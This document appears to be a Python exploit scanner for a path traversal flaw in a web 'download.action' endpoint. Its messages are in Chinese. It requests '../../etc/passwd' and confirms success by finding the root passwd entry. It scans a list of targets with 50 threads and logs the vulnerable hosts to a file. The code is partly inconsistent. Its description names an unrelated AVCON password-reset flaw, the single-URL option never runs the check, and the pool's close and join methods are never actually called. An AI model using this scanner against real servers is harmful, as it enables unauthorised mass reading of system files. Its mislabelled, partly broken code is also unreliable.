import argparse,sys,requests
from multiprocessing.dummy import Pool
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def poc(target):
    payload="/download.action?filename=../../../../../../../../etc/passwd"
    headres={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close"
    }
    try:
        res1=requests.get(url=target,headers=headres,verify=False)
        if res1.status_code == 200:
            res2=requests.get(url=target+payload,headers=headres,verify=False)
            if 'root:x:0:0:root:/root:/bin/bash' in res2.text:
                print(f"[+]{target}存在任意读取漏洞")
                with open('result1.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]该{target}不存在任意读取漏洞")
        else:
            print(f"[*]该{target}存在问题,请手工测试")        
    except:
        pass
def main():
    #定义
    parser=argparse.ArgumentParser(description="AVCON-网络视频服务系统editusercommit.php存在任意用户重置密码漏洞")
    # 添加命令行参数
    parser.add_argument('-u','--url',dest='url',type=str,help='place input lik')
    parser.add_argument('-f','--file',dest='file',type=str,help='place input your le path')
    # 实例化
    args=parser.parse_args()
    # 判断用户的输入
    if args.url and not args.file:
        print(args.url)
    if args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        mp=Pool(50)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage: python{sys.argv[0]} -h")
if __name__=='__main__':
    main()



